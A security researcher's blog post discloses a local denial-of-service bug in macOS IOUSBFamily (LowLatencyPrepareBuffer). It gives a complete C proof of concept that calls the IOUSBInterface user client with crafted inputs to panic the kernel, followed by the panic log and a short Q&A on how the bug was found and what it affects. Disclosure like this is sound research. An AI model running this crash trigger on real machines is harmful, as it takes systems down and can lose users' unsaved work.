---
layout: default
author: juwei lin
date: 2018-09-29 22:00:00 +0800
---

# macOS IOUSBFamily Local DOS Bug 

## Overview
There are some functions in kernel calling `panic()`. One of them is `IOUSBInterfaceUserClient::LowLatencyPrepareBuffer`.  
This case is of type local DOS. It is not exploitable.  

## PoC
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <IOKit/IOKitLib.h>


void trigger(io_connect_t conn, uint32_t value)
{
    uint64_t INPUTSCALAR[8];
    uint32_t INPUTSCALARCNT = 0;
    
    char INPUTSTRUCT[4096];
    size_t INPUTSTRUCTCNT = 0;
    
    uint64_t OUTPUTSCALAR[8] = {0};
    uint32_t OUTPUTSCALARCNT = 0;
    
    char OUTPUTSTRUCT[4096];
    size_t OUTPUTSTRUCTCNT = 0;
    
    INPUTSCALARCNT = 7;
    OUTPUTSCALARCNT = 1;
    INPUTSTRUCTCNT = 0;
    OUTPUTSTRUCTCNT = 0;
    //0x1ff, 0x7fffffff, 0xfffffffffffffe5d, 0x0, 0x5, 0x1, 0x3
    INPUTSCALAR[0] = 0x1ff;
    INPUTSCALAR[1] = 0x7fffffff;
    INPUTSCALAR[2] = 0xfffffffffffffe5d;
    INPUTSCALAR[3] = 0x0;
    INPUTSCALAR[4] = 0x5;
    INPUTSCALAR[5] = 0x1;
    INPUTSCALAR[6] = 0x3;
    
    IOConnectCallMethod(
                        conn,
                        0x11,
                        INPUTSCALAR,
                        INPUTSCALARCNT,
                        INPUTSTRUCT,
                        INPUTSTRUCTCNT,
                        OUTPUTSCALAR,
                        &OUTPUTSCALARCNT,
                        OUTPUTSTRUCT,
                        &OUTPUTSTRUCTCNT);
    
}


int main(){
    
    kern_return_t err;
    
    CFMutableDictionaryRef Matching = IOServiceMatching("IOUSBInterface");
    
    if(!Matching){
        
        printf("UNABLE TO CREATE SERVICE MATCHING DICTIONARY\n");
        
        return 0;
        
    }
    
    io_iterator_t iterator;
    
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, Matching, &iterator);
    
    if (err != KERN_SUCCESS){
        
        printf("NO MATCHES\n");
        return 0;
    }
    
    io_service_t service = IOIteratorNext(iterator);
    
    if (service == IO_OBJECT_NULL){
        
        printf("UNABLE TO FIND SERVICE\n");
        
        return 0;
        
    }
    
    io_connect_t CONN = MACH_PORT_NULL;
    
    err = IOServiceOpen(service, mach_task_self(), 0, &CONN);
    
    if (err != KERN_SUCCESS){
        
        printf("UNABLE TO GET USER CLIENT CONNECTION\n");
        
        return 0;
        
    }else{
        
        printf("GOT USERCLIENT CONNECTION: %X, TYPE:%D\n", CONN, 0);
        
    }
    
    trigger(CONN, 0);
    
    printf("PANIC?\n");
    
    return 0;
    
}

```

## PanicLog
```
Anonymous UUID:       039B94D9-F271-8A3F-BAE4-C8BF9D6B5BEE

Mon Oct 29 17:04:37 2018

*** Panic Report ***
panic(cpu 0 caller 0xffffff801a85eafc): "overflow detected"@/BuildRoot/Library/Caches/com.apple.xbs/Binaries/xnu/install/TempContent/Objects/EXPORT_HDRS/osfmk/mach/vm_param.h:364
Backtrace (CPU 0), Frame : Return Address
0xffffff887d7535f0 : 0xffffff801a1aca1d mach_kernel : _handle_debugger_trap + 0x48d
0xffffff887d753640 : 0xffffff801a2e6b13 mach_kernel : _kdp_i386_trap + 0x153
0xffffff887d753680 : 0xffffff801a2d859a mach_kernel : _kernel_trap + 0x4fa
0xffffff887d7536f0 : 0xffffff801a159ca0 mach_kernel : _return_from_trap + 0xe0
0xffffff887d753710 : 0xffffff801a1ac437 mach_kernel : _panic_trap_to_debugger + 0x197
0xffffff887d753830 : 0xffffff801a1ac283 mach_kernel : _panic + 0x63
0xffffff887d7538a0 : 0xffffff801a85eafc mach_kernel : __ZN24IOBufferMemoryDescriptor20initWithPhysicalMaskEP4taskjyyy + 0x1ac
0xffffff887d753940 : 0xffffff801a85fd2a mach_kernel : __ZN24IOBufferMemoryDescriptor22inTaskWithPhysicalMaskEP4taskjyy + 0x8a
0xffffff887d753980 : 0xffffff7f9b1a5f30 com.apple.iokit.IOUSBFamily : __ZN24IOUSBInterfaceUserClient23LowLatencyPrepareBufferEP26LowLatencyUserBufferInfoV3Py + 0x1ca
0xffffff887d7539e0 : 0xffffff801a858e15 mach_kernel : __ZN13IOCommandGate9runActionEPFiP8OSObjectPvS2_S2_S2_ES2_S2_S2_S2_ + 0xb5
0xffffff887d753a50 : 0xffffff7f9b1a1591 com.apple.iokit.IOUSBFamily : __ZN24IOUSBInterfaceUserClient24_LowLatencyPrepareBufferEPS_PvP25IOExternalMethodArguments + 0x137
0xffffff887d753ae0 : 0xffffff801a885178 mach_kernel : __ZN12IOUserClient14externalMethodEjP25IOExternalMethodArgumentsP24IOExternalMethodDispatchP8OSObjectPv + 0x1d8
0xffffff887d753b30 : 0xffffff801a88e5ff mach_kernel : _is_io_connect_method + 0x20f
0xffffff887d753c70 : 0xffffff801a2931f4 mach_kernel : _iokit_server_routine + 0x5e84
0xffffff887d753d80 : 0xffffff801a1b210d mach_kernel : _ipc_kobject_server + 0x12d
0xffffff887d753dd0 : 0xffffff801a18cad5 mach_kernel : _ipc_kmsg_send + 0x225
0xffffff887d753e50 : 0xffffff801a1a148e mach_kernel : _mach_msg_overwrite_trap + 0x38e
0xffffff887d753ef0 : 0xffffff801a2bfceb mach_kernel : _mach_call_munger64 + 0x22b
0xffffff887d753fa0 : 0xffffff801a15a486 mach_kernel : _hndl_mach_scall64 + 0x16
      Kernel Extensions in backtrace:
         com.apple.iokit.IOUSBFamily(900.4.2)[B3A7BE9C-2002-3891-B7D1-A84CEA0AC9E0]@0xffffff7f9b18c000->0xffffff7f9b226fff
            dependency: com.apple.iokit.IOPCIFamily(2.9)[2CE7BCB3-0766-3A94-A8D4-29BF3EBAEFBC]@0xffffff7f9aa95000
            dependency: com.apple.iokit.IOUSBHostFamily(1.2)[ED37A531-57CD-313C-B164-BC0F33B09D35]@0xffffff7f9b0e1000
            dependency: com.apple.driver.usb.AppleUSBCommon(1.0)[7F32C612-AC3B-333C-9067-5EAB39CF6EC3]@0xffffff7f9b0d9000
```

## Q & A
### How did you find this vulnerability?
by fuzzing.

### Can you identify exploitability?
This is local DOS case in kernel. It is not exploitable.

### Can you identify root cause?
Yes, the panic function is called directly in kernel.

### Vulnerable software and hardware
macOS 10.14 and all before  

  [Back Home]({{site.url}}{{site.baseurl}})
